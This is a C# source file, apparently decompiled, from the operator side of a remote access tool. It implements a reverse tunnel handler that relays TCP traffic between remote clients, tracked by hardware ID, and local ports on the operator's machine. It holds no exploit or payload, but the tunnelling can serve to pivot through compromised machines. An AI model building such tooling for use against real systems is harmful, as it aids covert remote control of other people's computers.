using System;
using System.Collections.Generic;
using System.Drawing;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using Leb128;
using Server.Connectings;
using Server.Forms;
using Server.Helper;

namespace Server.Messages;

internal class HandlerReverseTunnel
{
	private static Dictionary<string, Dictionary<int, TcpClient>> clientConnections = new Dictionary<string, Dictionary<int, TcpClient>>();

	private static Dictionary<string, TcpListener> serverListeners = new Dictionary<string, TcpListener>();

	public static void Read(Clients client, object[] array)
	{
		if (client == null || array == null || array.Length < 2)
		{
			client?.Disconnect();
			return;
		}
		try
		{
			string command = (string)array[1];
			string hwid = client.Hwid;
			switch (command)
			{
			case "Started":
			{
				int remotePort = (int)array[2];
				FormReverseTunnel form3 = (FormReverseTunnel)Application.OpenForms["ReverseTunnel:" + hwid];
				if (form3 != null)
				{
					form3.Invoke((MethodInvoker)delegate
					{
						form3.UpdateStatus("Tunnel started on port " + remotePort);
					});
				}
				Methods.AppendLogs(client.IP, "Reverse Tunnel started on port " + remotePort, Color.Green);
				break;
			}
			case "Stopped":
			{
				FormReverseTunnel form2 = (FormReverseTunnel)Application.OpenForms["ReverseTunnel:" + hwid];
				if (form2 != null)
				{
					form2.Invoke((MethodInvoker)delegate
					{
						form2.UpdateStatus("Tunnel stopped");
					});
				}
				Methods.AppendLogs(client.IP, "Reverse Tunnel stopped", Color.Orange);
				if (!clientConnections.ContainsKey(hwid))
				{
					break;
				}
				foreach (TcpClient conn in clientConnections[hwid].Values)
				{
					try
					{
						conn.Close();
					}
					catch
					{
					}
				}
				clientConnections.Remove(hwid);
				break;
			}
			case "NewConnection":
			{
				int connectionId = (int)array[2];
				int localPort = (int)array[3];
				try
				{
					TcpClient tcpClient = new TcpClient("127.0.0.1", localPort);
					if (!clientConnections.ContainsKey(hwid))
					{
						clientConnections[hwid] = new Dictionary<int, TcpClient>();
					}
					clientConnections[hwid][connectionId] = tcpClient;
					Thread thread = new Thread((ThreadStart)delegate
					{
						ReadFromLocalService(client, hwid, connectionId, tcpClient);
					});
					thread.IsBackground = true;
					thread.Start();
					Methods.AppendLogs(client.IP, "New connection established: " + connectionId, Color.Blue);
					break;
				}
				catch (Exception ex)
				{
					Methods.AppendLogs(client.IP, "Failed to connect to local port: " + ex.Message, Color.Red);
					break;
				}
			}
			case "Data":
			{
				int connectionId3 = (int)array[2];
				byte[] data = (byte[])array[3];
				if (clientConnections.ContainsKey(hwid) && clientConnections[hwid].ContainsKey(connectionId3))
				{
					try
					{
						clientConnections[hwid][connectionId3].GetStream().Write(data, 0, data.Length);
						break;
					}
					catch (Exception ex2)
					{
						Methods.AppendLogs(client.IP, "Error forwarding data: " + ex2.Message, Color.Red);
						CloseConnection(client, hwid, connectionId3);
						break;
					}
				}
				break;
			}
			case "Disconnect":
			{
				int connectionId2 = (int)array[2];
				CloseConnection(client, hwid, connectionId2);
				break;
			}
			case "Error":
			{
				string errorMsg = (string)array[2];
				Methods.AppendLogs(client.IP, "Reverse Tunnel Error: " + errorMsg, Color.Red);
				FormReverseTunnel form = (FormReverseTunnel)Application.OpenForms["ReverseTunnel:" + hwid];
				if (form != null)
				{
					form.Invoke((MethodInvoker)delegate
					{
						form.UpdateStatus("Error: " + errorMsg);
					});
				}
				break;
			}
			}
		}
		catch (Exception ex3)
		{
			Methods.AppendLogs(client.IP, "HandlerReverseTunnel error: " + ex3.Message, Color.Red);
		}
	}

	private static void ReadFromLocalService(Clients client, string hwid, int connectionId, TcpClient tcpClient)
	{
		byte[] buffer = new byte[8192];
		NetworkStream stream = null;
		try
		{
			stream = tcpClient.GetStream();
			while (tcpClient.Connected && client.itsConnect)
			{
				int bytesRead = stream.Read(buffer, 0, buffer.Length);
				if (bytesRead > 0)
				{
					byte[] data = new byte[bytesRead];
					Array.Copy(buffer, data, bytesRead);
					client.Send(LEB128.Write(new object[4] { "ReverseTunnel", "Data", connectionId, data }));
					continue;
				}
				break;
			}
		}
		catch
		{
		}
		finally
		{
			CloseConnection(client, hwid, connectionId);
			client.Send(LEB128.Write(new object[3] { "ReverseTunnel", "Disconnect", connectionId }));
		}
	}

	private static void CloseConnection(Clients client, string hwid, int connectionId)
	{
		try
		{
			if (clientConnections.ContainsKey(hwid) && clientConnections[hwid].ContainsKey(connectionId))
			{
				clientConnections[hwid][connectionId].Close();
				clientConnections[hwid].Remove(connectionId);
			}
		}
		catch
		{
		}
	}
}
